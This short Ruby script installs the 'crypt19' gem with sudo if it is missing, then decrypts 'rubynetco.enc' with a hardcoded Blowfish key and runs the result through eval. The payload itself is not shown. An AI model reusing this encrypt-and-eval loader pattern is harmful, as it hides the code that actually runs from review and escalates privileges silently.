
begin
  gem 'crypt19'
rescue LoadError
  system('sudo gem install crypt19')
  Gem.clear_paths
end
require 'rubygems'
require 'crypt/blowfish'
 key = "tB9zSEWDMJagnRothhe"
begin
file = File.open("rubynetco.enc", "r")
  contents = file.read
  blowfish = Crypt::Blowfish.new(key)
  eval blowfish.decrypt_string(contents)
rescue Exception => e
  puts "Something Went Wrong!!!"
  puts e
end